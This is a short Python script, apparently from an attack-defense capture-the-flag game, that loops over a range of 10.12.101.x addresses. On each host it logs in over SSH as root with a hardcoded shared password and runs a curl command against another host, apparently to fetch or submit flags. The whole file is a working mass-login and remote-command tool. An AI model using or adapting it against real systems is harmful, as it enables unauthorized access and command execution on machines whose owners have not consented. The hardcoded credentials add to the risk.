import paramiko

def getflag(ip,username,passwd,cmd):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, 22, username, passwd, timeout=10)
        for m in cmd:
            stdin, stdout, stderr = ssh.exec_command(m)
            #           stdin.write("Y")   #简单交互，输入 ‘Y’
            out = stdout.readlines()
            # 屏幕输出
            for o in out:
                print(o)
        print('%s\tOK\n' % (ip))
        ssh.close()
    except:
        print('%s\tError\n' % (ip))

def main():
    ip_base='10.12.101.'
	# input your command
    cmd=['curl http://10.12.101.181/?r=f/v',]
	# the ip range
    for i in range(132,138):
        ip=ip_base+str(i)
        if ip=='10.12.101.133':
            continue
        getflag(ip,'root','20120221',cmd)

if __name__=='__main__':
    main()
